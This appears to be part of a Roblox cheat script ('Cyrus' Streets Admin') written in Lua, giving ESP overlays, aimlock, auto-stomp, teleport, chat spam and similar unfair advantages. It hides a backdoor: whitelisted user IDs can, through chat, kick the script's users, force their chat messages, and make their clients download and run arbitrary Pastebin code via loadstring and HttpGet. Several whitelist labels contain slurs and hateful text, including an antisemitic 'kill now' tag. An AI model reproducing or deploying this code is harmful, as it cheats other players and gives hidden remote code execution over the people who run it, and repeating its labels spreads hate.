				if (PartFound.Position - Players[i].Character.Torso.Position).magnitude < 50  and Players[i].Character:FindFirstChild'KO' and Players[i].Character.Humanoid.Health > 0 and not LP.Character:FindFirstChild'KO' and LP.Character.Humanoid.Health > 0  and not Players[i]:FindFirstChild'Dragged' and not table.find(DontStompWhitelisted,Players[i].UserId) then
					PartFound.CFrame = CFrame.new(Players[i].Character.Torso.Position)
					LP.Backpack.ServerTraits.Finish:FireServer(LP.Backpack:FindFirstChild'Punch' or LP.Character:FindFirstChild'Punch')
				end
			end
		end
	end
	if AirWalkOn and LP.Character:FindFirstChild'Humanoid' and PartFound then 
		LP.Character.Humanoid.HipHeight = 0
		AirWalk.CFrame = PartFound.CFrame * CFrame.new(0,-3.5,0)
	end
	if CamLocking and CamlockPlayer and CamlockPlayer.Character and CamlockPlayer.Character:FindFirstChild'Torso' then 
		workspace.CurrentCamera.CoordinateFrame = CFrame.new(workspace.CurrentCamera.CoordinateFrame.p,CamlockPlayer.Character.Head.CFrame.p)
	end
    for i = 1,#PlayerTable do
		local Player,TopLeft,TopRight,BottomLeft,BottomRight = PlayerTable[i][1],PlayerTable[i][2],PlayerTable[i][3],PlayerTable[i][4],PlayerTable[i][5]
		local Text,Tracer,IsUser = PlayerTable[i][6],PlayerTable[i][7],PlayerTable[i][8]
		 if Player and Player.Character and Player.Character:FindFirstChild'Head' and LP.Character and LP.Character:FindFirstChild'Head' then 
			 local Part = Player.Character:FindFirstChild'HumanoidRootPart' or Player.Character:FindFirstChild'Torso'
			 if Part then
				 local Cframe = Part.CFrame
				 local h = Player.Character.Head.Size.Y / 2
				 local Size = Vector3.new(2,3,0) * (h * 2)
				 local RelativeHeadPos,TextOnScreen = workspace.CurrentCamera:WorldToViewportPoint(Player.Character.Head.Position)
				 local TopLeftPos = workspace.CurrentCamera:WorldToViewportPoint((Cframe * CFrame.new(Size.X,Size.Y,0)).p)
				 local TopRightPos = workspace.CurrentCamera:WorldToViewportPoint((Cframe * CFrame.new(-Size.X,Size.Y,0)).p)
				 local BottomLeftPos = workspace.CurrentCamera:WorldToViewportPoint((Cframe * CFrame.new(Size.X,-Size.Y,0)).p)
				 local BottomRightPos = workspace.CurrentCamera:WorldToViewportPoint((Cframe * CFrame.new(-Size.X,-Size.Y,0)).p)
				 if RobloxInForeground then 
					 TopLeft.Visible = TextOnScreen
					 TopRight.Visible = TextOnScreen
					 BottomLeft.Visible = TextOnScreen
					 BottomRight.Visible = TextOnScreen
					 if DrawTable['Visible'] then 
						 Tracer.Visible = TextOnScreen
					 else 
						Tracer.Visible = false
					 end 
					 Text.Visible = TextOnScreen
				 else 
					 TopLeft.Visible = false
					 TopRight.Visible = false
					 BottomLeft.Visible = false
					 BottomRight.Visible = false
					 Tracer.Visible = false
					 Text.Visible = false
				 end 
				 if TextOnScreen and RobloxInForeground then
					 Text.Position = Vector2.new(RelativeHeadPos.X,RelativeHeadPos.Y) + Vector2.new(0,-30)
					 Text.Center = true
					 Text.Color = EspColour
					 Text.Text = Player.Name.." | Health: "..checkHp(Player.Character).." | Cy Admin User: "..IsUser.."\nHas: Glock "..hasItem(Player,"Glock").." | Shotty "..hasItem(Player,"Shotty").." | Vest "..hasItem(Player,"BulletResist")
					 TopLeft.From = Vector2.new(TopLeftPos.X,TopLeftPos.Y)
					 TopLeft.To = Vector2.new(TopRightPos.X,TopRightPos.Y)
					 TopRight.From = Vector2.new(TopRightPos.X,TopRightPos.Y)
					 TopRight.To = Vector2.new(BottomRightPos.X,BottomRightPos.Y)
					 BottomLeft.From = Vector2.new(BottomLeftPos.X,BottomLeftPos.Y)
					 BottomLeft.To = Vector2.new(TopLeftPos.X,TopLeftPos.Y)
					 BottomRight.From = Vector2.new(BottomRightPos.X,BottomRightPos.Y)
					 BottomRight.To = Vector2.new(RelativeHeadPos.X,RelativeHeadPos.Y)
					 if tostring(Player) == tostring(AimlockTarget) or tostring(Player) == tostring(CamlockPlayer) then 
						Tracer.Color = Color3.fromRGB(144,0,0)
					 else 
						Tracer.Color = DrawTable['LineColour']
					 end
					 Tracer.Thickness = DrawTable['Thickness']
					 Tracer.Transparency = DrawTable['Transparency']
					 Tracer.From = Vector2.new(workspace.CurrentCamera.ViewportSize.X / 2,workspace.CurrentCamera.ViewportSize.X / 2 + 400)
					 Tracer.To = Vector2.new(RelativeHeadPos.X,RelativeHeadPos.Y)
				 end
			 end
		 end
	 end 
end

local function CChildAdded(Thing)
	if Thing.Name == "KO" and AutoDie then 
		GetChar():BreakJoints()
	end
end

Cframe.BackgroundColor3 = Color3.new(0.666667,0,0)
Cframe.BackgroundTransparency = 0.20000000298023
Cframe.BorderSizePixel = 0
Cframe.Position = UDim2.new(0, 0, 1, 0)
Cframe.Size = UDim2.new(0, 270, 0, 35)

CText.BackgroundColor3 = Color3.new(0,0.000738177,0.000738177)
CText.BorderSizePixel = 0
CText.Position = UDim2.new(0, 5, 0, 5)
CText.Size = UDim2.new(0, 260, 0, 25)
CText.Font = Enum.Font.SourceSansLight
CText.Text = ""
CText.TextColor3 = Color3.new(1, 1, 1)
CText.TextScaled = true
CText.TextSize = 14
CText.TextWrapped = true

CmdFrame.BackgroundColor3 = Color3.new(0, 0.000738177, 0.000738177)
CmdFrame.BorderSizePixel = 0
CmdFrame.Position = UDim2.new(0, 0, -4, 0)
CmdFrame.Size = UDim2.new(1, 0, 4, 0)
CmdFrame.Visible = false

local function Create(Text)
if not Text then return end
	local CmdList = Instance.new("TextLabel",CmdFrame)
	CmdList.BackgroundColor3 = Color3.new(0.666667, 0, 0)
	CmdList.BackgroundTransparency = 0.20000000298023
	CmdList.BorderSizePixel = 0
	CmdList.Position = UDim2.new(-10, 0, 0, 0)
	CmdList.Size = UDim2.new(1, 0, 0, 20)
	CmdList.Font = Enum.Font.SourceSansLight
	CmdList.Text = Text
	CmdList.TextColor3 = Color3.new(0.952941, 0.952941, 0.952941)
	CmdList.TextScaled = true
	CmdList.TextWrapped = true
end

local function Changed()
pcall(function() 
	if CText.Text ~= "" then
		CmdFrame.Visible = true
		local PositionMatch = 0
		for _,cmd in pairs(CmdFrame:GetChildren()) do
				if string.find(string.lower(cmd.Text),string.lower(CText.Text)) then
					cmd.Position = UDim2.new(0, 0, 0, 2 + (PositionMatch * 20))
					PositionMatch = PositionMatch + 1
					if cmd.Position == UDim2.new(0, 0, 0, 142) then
						cmd.Position = UDim2.new(-10, 0, 0, 0)
						PositionMatch = PositionMatch - 1
					end
				else
					cmd.Position = UDim2.new(-10, 0, 0, 0)
				end
			end
		else
			CmdFrame.Visible = false
		end
	end)
end

MainFrame.BackgroundColor3 = Color3.fromRGB(0,0,0)
MainFrame.BackgroundTransparency = 0.250
MainFrame.BorderColor3 = Color3.fromRGB(53,2,2)
MainFrame.BorderSizePixel = 8
MainFrame.Position = UDim2.new(0,695,0,297)
MainFrame.Size = UDim2.new(0,495,0,431)
MainFrame.AnchorPoint = Vector2.new(0,0)
MainFrame.Visible = false 
MainFrame.Active = true 
MainFrame.Draggable = true 

ScrollingFrame.BackgroundColor3 = Color3.fromRGB(53,2,2)
ScrollingFrame.BackgroundTransparency = 0.400
ScrollingFrame.BorderColor3 = Color3.fromRGB(0,0,0)
ScrollingFrame.BorderSizePixel = 5
ScrollingFrame.Position = UDim2.new(0.0880542845,0,0.126374945,0)
ScrollingFrame.Size = UDim2.new(0,411,0,348)

SearchBar.BackgroundColor3 = Color3.fromRGB(53,2,2)
SearchBar.BackgroundTransparency = 0.400
SearchBar.BorderColor3 = Color3.fromRGB(0,0,0)
SearchBar.BorderSizePixel = 5
SearchBar.Position = UDim2.new(0.0880542994,0,0.0598471165,0)
SearchBar.Size = UDim2.new(0,411,0,28)
SearchBar.Font = Enum.Font.SourceSansBold
SearchBar.PlaceholderColor3 = Color3.fromRGB(255,255,255)
SearchBar.Text = "Search"
SearchBar.TextColor3 = Color3.fromRGB(135, 135, 135)
SearchBar.TextSize = 24.000

Credits.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Credits.BackgroundTransparency = 0.250
Credits.BorderColor3 = Color3.fromRGB(53, 2, 2)
Credits.BorderSizePixel = 5
Credits.Position = UDim2.new(-0.00101006031,0,0.948468387,0)
Credits.Size = UDim2.new(0,187,0,22)
Credits.Font = Enum.Font.SourceSansBold
Credits.Text = "UI Design by !fishgang Karma#9669"
Credits.TextColor3 = Color3.fromRGB(255,255,255)
Credits.TextSize = 14.000

DmgIndicator.BackgroundColor3 = Color3.fromRGB(0,0,0)
DmgIndicator.BackgroundTransparency = 0.700
DmgIndicator.BorderSizePixel = 3
DmgIndicator.Position = UDim2.new(0,0,1.00488257,0)
DmgIndicator.Size = UDim2.new(0,385,0,50)
DmgIndicator.Font = Enum.Font.SourceSans
DmgIndicator.Text = ''
DmgIndicator.TextColor3 = Color3.fromRGB(184,0,3)
DmgIndicator.TextScaled = true
DmgIndicator.TextSize = 30.000
DmgIndicator.TextWrapped = true
DmgIndicator.Visible = false 

local function CreateCommand(Pos,Text)
	local ActualCommands = Instance.new('TextLabel',ScrollingFrame)
	ActualCommands.BackgroundColor3 = Color3.fromRGB(26, 26, 26)
	ActualCommands.BackgroundTransparency = 0.200
	ActualCommands.BorderColor3 = Color3.fromRGB(53, 2, 2)
	ActualCommands.Position = Pos
	ActualCommands.Size = UDim2.new(0, 382, 0, 20)
	ActualCommands.Font = Enum.Font.SourceSansBold
	ActualCommands.Text = Text
	ActualCommands.TextColor3 = Color3.fromRGB(255, 255, 255)
	ActualCommands.TextSize = 14.000
	ActualCommands.TextScaled = true 
	ActualCommands.TextWrapped = true
end

SearchBar.Changed:Connect(function()
local Index = 0
	if SearchBar.Text then
		for _,v in pairs(ScrollingFrame:GetChildren()) do
			if not string.find(v.Text:lower(),SearchBar.Text:lower()) then
				v.Visible = false
			else
				v.Visible = true
				Index = Index + 1
				v.Position = UDim2.new(0.0150422715,0,0.0127776451,0 + (Index * 20))
			end
		end
	end
end)

local CoolkidTable = {
	['300227703']	= {
		['Name']   = "!fishgang Envy";
		['Colour'] = Color3.fromRGB(125,0,0);
		['Access'] = true;
	};
    ['590620847'] 	= {
		['Name']   = "!fishgang Envy";
		['Colour'] = Color3.fromRGB(125,0,0);
		['Access'] = true;
	};
    ['714877']      = {
		['Name']   = "!fishgang Ambiguity";
		['Colour'] = Color3.fromRGB(57,52,52);
		['Access'] = true;
	};
    ['96316322']    = {
		['Name']   = "!fishgang Ambiguity";
		['Colour'] = Color3.fromRGB(57,52,52);
		['Access'] = true;
	};
    ['114164798']   = {
		['Name']   = "!fishgang Slays | [RPF] Retard Prevention Force";
		['Colour'] = Color3.fromRGB(0,255,255);
		['Access'] = true;
	};
	['359564044'] 	= {
		['Name']   = "!fishgang 7w4c";
		['Colour'] = Color3.fromRGB(255,255,255);
		['Access'] = true;
	};
	['659119329'] 	= {
		['Name']   = "!fishgang Co-owner Cy | Creator of Cyrus' Streets Admin";
		['Colour'] = Color3.fromRGB(212,224,255);
		['Access'] = true;
	};
    ['659119329']   = {
		['Name']   = "!fishgang Co-owner Cy Alt | Creator of Cyrus' Streets Admin";
		['Colour'] = Color3.fromRGB(212,224,255);
		['Access'] = true;
	};
	['1388703832'] 	= {
		['Name']   = "!fishgang Co-owner Cy Main | Creator of Cyrus' Streets Admin";
		['Colour'] = Color3.fromRGB(212,224,255);
		['Access'] = true;
	};
	['62009114'] 	= {
		['Name']   = "!fishgang Owner X_D6";
		['Colour'] = Color3.fromRGB(176,16,16);
		['Access'] = true;
	};
	['57370993'] 	= {
		['Name']   = "!fishgang Karma";
		['Colour'] = Color3.fromRGB(255,0,0);
		['Access'] = true;
	};
	['20220183'] 	= {
		['Name']   = "!fishgang Wya";
		['Colour'] = Color3.fromRGB(215,19,19);
		['Access'] = true;
	};
	['1477162063']  = {
		['Name'] = "!fishgang Wya (YFRWK)";
		['Colour'] = Color3.fromRGB(192,6,6);
		['Access'] = true;
	};
	['105183043'] 	= {
		['Name']   = "Drpoppadopolist | Drpoppa Creator";
		['Colour'] = Color3.fromRGB(107,50,124);
		['Access'] = true;
	};
	['1190936'] 	= {
		['Name']   = "trippinfo";
		['Colour'] = Color3.fromRGB(12,4,134);
		['Access'] = true;
	};
	['378666469'] = {
		['Name']   = "trippinfo";
		['Colour'] = Color3.fromRGB(12,4,134);
		['Access'] = true;
	};
	['1443431439']  = {
		['Name']   = "wk1r";
		['Colour'] = Color3.fromRGB(194,23,255);
		['Access'] = true;
	};
	['164282612']   = {
		['Name']   = "wk1r";
		['Colour'] = Color3.fromRGB(194,23,255);
		['Access'] = true;
	};
	['1299915133']  = {
		['Name']   = "wk1r";
		['Colour'] = Color3.fromRGB(194,23,255);
		['Access'] = true;
	};
	['548617338']   = {
		['Name']   = "Cool Person";
		['Colour'] = Color3.fromRGB(36,89,237);
		['Access'] = false;
	};
	['1275692258']  = { 
		['Name']   = "Gross a lynx member";
		['Colour'] = Color3.fromRGB(125,0,0);
		['Access'] = false;
	};
	['612618136']   = { 
		['Name']   = "Bird (Donator)";
		['Colour'] = Color3.fromRGB(125,0,0);
		['Access'] = false;
	};
	['284761493']   = {
		['Name']   = "[Strafe] XVE | voidbound.xyz";
		['Colour'] = Color3.fromRGB(102,0,0);
		['Access'] = true;
	};
	['178560']      = {
		['Name'] = "Literally a fucking egg.";
		['Colour'] =  Color3.fromRGB(255,248,11);
		['Access'] = false;
	};
	['120476167']   = {
		['Name']   = "Pawels Owner";
		['Colour'] = Color3.fromRGB(52,152,219);
		['Access'] = true;
	};
	['120476167']   = {
		['Name']   = "Pawels Owner";
		['Colour'] = Color3.fromRGB(52,152,219);
		['Access'] = true;
	};
	['418171482'] 	= {
		['Name'] = "Woman beater";
		['Colour'] = Color3.fromRGB(255,0,70);
		['Access'] = false;
	};
	['710288902'] 	= {
		['Name'] = "!fishgang Autism";
		['Colour'] = Color3.fromRGB(0,255,0);
		['Access'] = false;
	};
	['383632734']   = {
		['Name'] = "Dot_Mp4 phonk phonk rattle rattle supplier";
		['Colour'] = Color3.fromRGB(255,0,0);
		['Access'] = true;
	};
	['1066524308']  = {
		['Name'] = "Kylee (kill her and get blacklisted)";
		['Colour'] = Color3.fromRGB(178,242,255);
		['Access'] = true;
	};
	['39939779']	= {
		['Name'] = "jewish overlord kill now";
		['Colour'] = Color3.fromRGB(0,1,0);
		['Access'] = true;
	};
	['1528488185'] = {
		['Name'] = "!fishgang Chronic (Oreo gangs #1 Hater)";
		['Colour'] = Color3.fromRGB(235,31,31);
		['Access'] = true;
	}
}
local Debounce = false 
local function ColourChanger(T)
	if T:IsA'Trail' and not CoolkidTable[tostring(LP.UserId)] then
		T.Color = BulletColour
	end
	if T:IsA'ObjectValue' and T.Name == "creator" and not Debounce then
		local Thing = T.Value
		local Method,Tool = Char(Thing)
		b(Thing.Name.." has "..Method.." from "..math.floor((GetChar().Head.Position - Thing.Head.Position).magnitude).." studs with a "..Tool.Name)
		if Tool.Name == "Shotty" then 
			Debounce = true 
			wait(0.7)
			Debounce = false 
		end 
	end
end

local function HealthChanged(Health)
	if Health <= HealBotHealth and HealBot and not TpBypass then 
		if GrabThing("Burger",GetChar().Head.CFrame) then
			local Hamborger = LP.Backpack:FindFirstChild'Burger'
			if Hamborger then 
				Hamborger.Parent = GetChar()
				Hamborger:Activate() -- CHEEMS
				repeat RunService.Heartbeat:Wait() until Hamborger.Parent ~= LP.Character
			end
		end -- yeah I copy pasted it from my heal cmd DEAL WITH IT 
		if GrabThing("Drink",GetChar().Head.CFrame) then
			local Drink = LP.Backpack:FindFirstChild'Drink'
			if Drink then 
				Drink.Parent = GetChar()
				Drink:Activate()
			end 
		end		
	end
end 

LP.CharacterAdded:Connect(function()
	GetChar():WaitForChild('Humanoid',10)
	ChildAddedEvent = GetChar().ChildAdded:Connect(CChildAdded)
	HumanoidStateChangedEvent = GetChar().Humanoid.StateChanged:Connect(HumanoidState)
	HumanoidCAdded = GetChar().Humanoid.DescendantAdded:Connect(ColourChanger)
	HumanoidHealthChanged = GetChar().Humanoid.HealthChanged:Connect(HealthChanged)
	GetChar().Humanoid.WalkSpeed = SpawnWS or NormalWS
    GetChar().Humanoid.JumpPower = SpawnJP or NormalJP
	GetChar().Humanoid.HipHeight = SpawnHH or NormalHH
	if FeLoop then 
		local Humanoid = GetChar().Humanoid:Clone()
		GetChar().Humanoid:Destroy()
		Humanoid.Parent = GetChar()
		workspace.CurrentCamera.CameraSubject = GetChar()
	end 
	if PlayOnDeath then
		wait()
		local Tool = LP.Backpack:WaitForChild('BoomBox')
		if Tool then 
			Tool.Parent = GetChar() 
			wait()
			Tool:FindFirstChildOfClass'RemoteEvent':FireServer("play",PlayOnDeath)
			Tool.Parent = LP.Backpack
		end
	end
end)

LP.CharacterRemoving:Connect(function()
	ChildAddedEvent:Disconnect()
	HumanoidStateChangedEvent:Disconnect()
	HumanoidCAdded:Disconnect()
	HumanoidHealthChanged:Disconnect()
	HR = nil
	flying = false
end)

UserInput.InputBegan:Connect(function(Key)
if UserInput:GetFocusedTextBox() then return end
local PartFound = GetChar():FindFirstChild'HumanoidRootPart' or GetChar():FindFirstChild'Torso'
	if Key.KeyCode == Enum.KeyCode.LeftControl then
		if AirWalkOn then 
			AirWalk.Size = Vector3.new(0,-1,0)
		end
		if Normalwalk and ControlSpeed == 8 then return end
		GetChar().Humanoid.WalkSpeed = ControlSpeed
	end
	if Key.KeyCode == Enum.KeyCode.LeftShift then
		KeyTable['Shift'] = true 
		if Normalwalk and ShiftSpeed == 25 then return end 
		GetChar().Humanoid.WalkSpeed = ShiftSpeed
	end
	if Key.KeyCode == Enum.KeyCode.W then 
		KeyTable['w'] = true 
	end
	if Key.KeyCode == Enum.KeyCode.A then 
		KeyTable['a'] = true 
	end
	if Key.KeyCode == Enum.KeyCode.S then 
		KeyTable['s'] = true 
	end
	if Key.KeyCode == Enum.KeyCode.D then 
		KeyTable['d'] = true 
	end
	if Key.KeyCode == Enum.KeyCode.E and GetChar():FindFirstChildOfClass'Tool' and not GetChar():FindFirstChild'KO' then 
		LP.Backpack.ServerTraits.Finish:FireServer(LP.Backpack.Punch)
	end 
	if Key.KeyCode == Enum.KeyCode.Space and AirWalkOn then 
		PartFound.CFrame = PartFound.CFrame + Vector3.new(0,5,0)
	end
	if Key.KeyCode == Enum.KeyCode.Quote then 
		CText:CaptureFocus()
		Cframe:TweenPosition(UDim2.new(0.015,0,0.95,0),"Out","Elastic",0.5,true)
		wait()
		CText.Text = ""
		UserInput.TextBoxFocusReleased:Wait()
		local Command = CText.Text
		CText.Text = ""
		CheckCommand(Command)
		Cframe:TweenPosition(UDim2.new(0.015,0,1,0),"Out","Quad",0.5,true)
	end
	if ClickTpKey and ClickTpKey ~= "" and Key.KeyCode == Enum.KeyCode[ClickTpKey:upper()] and Mouse.Target then
		if (Mouse.Hit.Position - PartFound.Position).magnitude < 50 then 
			PartFound.CFrame = CFrame.new(Mouse.Hit.p + Vector3.new(0,5,0))
		else
			Teleport(CFrame.new(Mouse.Hit.p + Vector3.new(0,5,0)))
		end
	end
	if Keys then 
		for _,v in pairs(Keys) do 
			if v and Enum.KeyCode[v:match'[%a%d]+$':upper()] == Key.KeyCode then 
				CheckCommand(v:match'^[%w%s]+')
			end
		end
	end
end)

UserInput.InputEnded:Connect(function(Key)
if UserInput:GetFocusedTextBox() then return end
	if Key.KeyCode == Enum.KeyCode.LeftControl then
		if AirWalkOn then
			AirWalk.Size = Vector3.new(5,1,5)
		end 
		if Normalwalk and ControlSpeed == 8 then return end
		GetChar().Humanoid.WalkSpeed = WalkSpeed
	end
	if Key.KeyCode == Enum.KeyCode.W then 
		KeyTable['w'] = false
	end
	if Key.KeyCode == Enum.KeyCode.A then 
		KeyTable['a'] = false 
	end
	if Key.KeyCode == Enum.KeyCode.S then 
		KeyTable['s'] = false 
	end
	if Key.KeyCode == Enum.KeyCode.D then 
		KeyTable['d'] = false 
	end
	if Key.KeyCode == Enum.KeyCode.LeftShift and ShiftSpeed then
		KeyTable['Shift'] = false 
		if Normalwalk and ShiftSpeed == 25 then return end 
		GetChar().Humanoid.WalkSpeed = WalkSpeed
	end 
end)

Players.PlayerRemoving:Connect(function(P)
	Unesp(P)
end)

CText.FocusLost:Connect(function(Enter)
	Cframe:TweenPosition(UDim2.new(0.015, 0, 1, 0),"Out","Quad",0.5,true)
	if Enter then 
		local Command = CText.Text
		CText.Text = ""
		CheckCommand(Command)
	end
end)

AddCommand(function(Arguments)
	if Arguments[1] then
		local File = loadfile("CyAdminPlugins\\"..Arguments[1])
		if not File then 
			ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Syntax Error (Can't output it since loadfile gay)","All")
			return 
		else 
			local W,E = pcall(File)
			if not W then 
				ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Runtime Error"..E,"All")
				return 
			end 
		end 
		local T = Temp()
		for i = 1,#Commands do
			if not table.find(T,Commands[i].Name) then 
				Create(Commands[i].Name)
				CreateCommand(UDim2.new(0.0150422715,0,0.0127776451,0 + (i * 20)),Commands[i].Name.." "..Commands[i].Help)
			end 
		end 
	end 
end,"runplugin",{},"Loads plugins (no it doesn't refresh them so don't be retarded") 
-- DON'T ASK ABOUT IT ANYONE WHO READS THIS CODE OK?

ChildAddedEvent = GetChar().ChildAdded:Connect(CChildAdded)
HumanoidStateChangedEvent = GetChar().Humanoid.StateChanged:Connect(HumanoidState)
HumanoidCAdded = GetChar().Humanoid.DescendantAdded:Connect(ColourChanger)
HumanoidHealthChanged = GetChar().Humanoid.HealthChanged:Connect(HealthChanged)
Mouse.Button1Down:Connect(Button1Down)
Mouse.Button2Down:Connect(Button2Down)
LP.Chatted:Connect(CheckCommand)
UserInput.JumpRequest:Connect(DoubleJump)
CText:GetPropertyChangedSignal("Text"):Connect(Changed)
RunService.Stepped:Connect(Stepped)

spawn(function()
	while true do
	local Char = GetChar()
	if Char then 
		local PartFound = Char:FindFirstChild'HumanoidRootPart' or Char:FindFirstChild'Torso'
			if Char:FindFirstChildOfClass'Humanoid' and UseDraw then
				local Tool = Char:FindFirstChildOfClass'Tool'
				if Tool and Tool:FindFirstChild'Ammo' then 
					DrawingT.Text = "Current WalkSpeed: "..Char.Humanoid.WalkSpeed.."\nSprinting Speed: "..ShiftSpeed.."\nCrouching Speed: "..ControlSpeed.."\nJumpPower: "..Char.Humanoid.JumpPower.."\nFlying: "..tostring(flying).."\nNoclipping: "..tostring(Noclipping).."\nAimlock Target: "..tostring(AimlockTarget).."\n"..Tool.Name.." Clips & Ammo: "..Tool.Clips.Value..":"..Tool.Ammo.Value
				else 
					DrawingT.Text = "Current WalkSpeed: "..Char.Humanoid.WalkSpeed.."\nSprinting Speed: "..ShiftSpeed.."\nCrouching Speed: "..ControlSpeed.."\nJumpPower: "..Char.Humanoid.JumpPower.."\nFlying: "..tostring(flying).."\nNoclipping: "..tostring(Noclipping).."\nAimlock Target: "..tostring(AimlockTarget) 
				end
			end
			if PartFound and Blinking then 
				if BlinkMode == "None" or BlinkMode == "Shift" and KeyTable['Shift'] then
					if KeyTable['w'] then 
						PartFound.CFrame = PartFound.CFrame * CFrame.new(0,0,-BlinkSpeed)
					end 
					if KeyTable['a'] then 
						PartFound.CFrame = PartFound.CFrame * CFrame.new(-BlinkSpeed,0,0)
					end
					if KeyTable['s'] then 
						PartFound.CFrame = PartFound.CFrame * CFrame.new(0,0,BlinkSpeed)
					end
					if KeyTable['d'] then 
						PartFound.CFrame = PartFound.CFrame * CFrame.new(BlinkSpeed,0,0)
					end
				end 
			end
			wait()
		end
	end 
end)

if PartTable then 
	spawn(function()
		while wait() do
			if LP.Character:FindFirstChildOfClass'Humanoid' and LP.Character.Humanoid.HipHeight > 0 or AirWalkOn and LP.Character.Humanoid.FloorMaterial == Enum.Material.Neon and not LP.Character.Humanoid.Sit then 
				local JP = LP.Character.Humanoid.JumpPower
				LP.Character.Humanoid.JumpPower = 1.5
				LP.Character.Humanoid:ChangeState(3)
				wait(0.2)
				LP.Character.Humanoid.JumpPower = JP
			end
		end
	end)
end

spawn(function()
	while wait(SpamDelay) do 
		if Spamming and SpamMessage then 
			ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(SpamMessage,"All")
		end
	end 
end)

spawn(function()
	while wait(10) do 
		if AntiAfk then 
			keypress(0x20)
		end
	end
end)

local function espcool(Plr)
	local Esp1 = Instance.new('BillboardGui',Plr.Character.Head)
	Esp1.Adornee = Plr.Character.Head
	Esp1.Size = UDim2.new(0,100,0,100)
	Esp1.StudsOffset = Vector3.new(0,1,0)
	Esp1.AlwaysOnTop = true 
	local Esp2 = Instance.new('TextLabel',Esp1)
	Esp2.BackgroundTransparency = 1
	Esp2.Text = CoolkidTable[tostring(Plr.UserId)].Name
	Esp2.Position = UDim2.new(0,0,0,0)
	Esp2.Size = UDim2.new(1,0,0,40)
	Esp2.TextColor3 = CoolkidTable[tostring(Plr.UserId)].Colour
	Esp2.TextStrokeTransparency = 0.5
	Esp2.TextSize = 15
	Esp2.TextStrokeColor3 = CoolkidTable[tostring(Plr.UserId)].Colour
	if Plr.Character:FindFirstChild'Humanoid' then 
		Plr.Character.Humanoid.DescendantAdded:Connect(function(T)
			if T:IsA'Trail' then 
				T.Color = ColorSequence.new(CoolkidTable[tostring(Plr.UserId)].Colour)
			end
		end)
	end
	local Table = {}
	for i,v in pairs(Plr.Backpack:GetChildren()) do if v:IsA'Tool' and v:FindFirstChild'Fire' then table.insert(Table,v) end end 
	for i,v in pairs(Plr.Character:GetChildren()) do if v:IsA'Tool' and v:FindFirstChild'Fire' then table.insert(Table,v) end end
	-- To make sure all tools get set ugly I know lol
	for Index,Tool in pairs(Table) do 
		for Index2,Part in pairs(Tool:GetDescendants()) do 
			if Part:IsA'UnionOperation' or Part:IsA'Part' or Part:IsA'MeshPart' then 
				if Part:IsA'UnionOperation' then
					Part.UsePartColor = true
				end 
				Part.Material = "ForceField" 
				Part.Color = CoolkidTable[tostring(Plr.UserId)].Colour
			end
		end
	end
	Plr.Character.ChildAdded:Connect(function(T)
		if T:IsA'Tool' and T:FindFirstChild'Fire' then 
			for Index2,Part in pairs(T:GetDescendants()) do 
				if Part:IsA'UnionOperation' or Part:IsA'Part' or Part:IsA'MeshPart' then 
					if Part:IsA'UnionOperation' then
						Part.UsePartColor = true
					end 
					Part.Material = "ForceField" 
					Part.Color = CoolkidTable[tostring(Plr.UserId)].Colour
				end
			end
		end
	end)
end

local PlayersX = Players:GetPlayers()
for i = 1,#PlayersX do
	local Plr = PlayersX[i]
	if CoolkidTable[tostring(Plr.UserId)] and Plr.Character:FindFirstChild'Head' then 
		espcool(Plr)
		Plr.CharacterAdded:Connect(function()
			local Head = Plr.Character:WaitForChild('Head',10)
			if Head then
				espcool(Plr)
			end
		end)
		if CoolkidTable[tostring(Plr.UserId)].Access then 
		Plr.Chatted:Connect(function(Chat)
			local Arguments = string.split(Chat:sub(2)," ")
			local Player = PlrFinder(Arguments[1])
			table.remove(Arguments,1)
			if Player and Player == LP or typeof(Player) == "table" then 
				if not CoolkidTable[tostring(LP.UserId)] then 
					if Chat:sub(1,1) == "`" then 
						CheckCommand(table.concat(Arguments," "))
					end
					if Chat:sub(1,1) == "[" then 
						LP:Kick('You have been kicked by '..Plr.Name.." for "..table.concat(Arguments," "))
					end
					if Chat:sub(1,1) == "~" then 
						ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("abc123","All")
					end
					if Chat:sub(1,1) == "]" then
						loadstring(game:HttpGet("https://pastebin.com/raw/"..Arguments[1],true))()
					end 
				end 
			end
		end)
	end
	end
	if Plr ~= LP then 
		local Chatted;
		Chatted = Plr.Chatted:Connect(function(A) -- had to make it a function instead of calling :Wait() on it or it would yield the whole loop lmao
			if A == "Hey I'm a cyrus' streets admin user1" then
				Chatted:Disconnect()
				Players:Chat("Hey I'm a cyrus' streets admin user1")
				local abc123;
				for i = 1,#PlayerTable do 
					if PlayerTable[i] and PlayerTable[i][2] == Plr then 
						PlayerTable[i][5] = "true"
						abc123 = true
					end
				end
				table.insert(AdminUsers,Plr.UserId)
				if not abc123 and UseDraw then 
					espPlayer(Plr,nil,true)
				end
			end
		end)
	end
end

Players.PlayerAdded:Connect(function(Plr)
	if CoolkidTable[tostring(Plr.UserId)] then
		Plr.CharacterAdded:Connect(function()
			if CoolkidTable[tostring(Plr.UserId)].Access then 
				Plr.Chatted:Connect(function(Chat)
					local Arguments = string.split(Chat:sub(2)," ")
					local Player = PlrFinder(Arguments[1])
					table.remove(Arguments,1)
					if Player and Player == LP or typeof(Player) == "table" then 
						if not CoolkidTable[tostring(LP.UserId)] then 
							if Chat:sub(1,1) == "`" then 
								CheckCommand(table.concat(Arguments," "))
							end
							if Chat:sub(1,1) == "[" then 
								LP:Kick('You have been kicked by '..Plr.Name.." for "..table.concat(Arguments," "))
							end
							if Chat:sub(1,1) == "~" then 
								ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("abc123","All")
							end
							if Chat:sub(1,1) == "]" then
								loadstring(game:HttpGet("https://pastebin.com/raw/"..Arguments[1],true))()
							end 
						end 
					end
				end)
			end
			local Head = Plr.Character:WaitForChild('Head',10)
			if Head then 
				espcool(Plr)
			end
		end)
	end
	local p;
	P = Plr.Chatted:Connect(function(A)
		if A == "Hey I'm a cyrus' streets admin user1" then 
			P:Disconnect()
			Players:Chat("Hey I'm a cyrus' streets admin user1")
			local abc123;
			for i = 1,#PlayerTable do 
				if PlayerTable[i] and PlayerTable[i][2] == Plr then 
					PlayerTable[i][5] = "true"
					abc123 = true
				end
			end
			table.insert(AdminUsers,Plr.UserId)
			if not abc123 and UseDraw then 
				espPlayer(Plr,nil,true)
			end
		end
	end)
end)

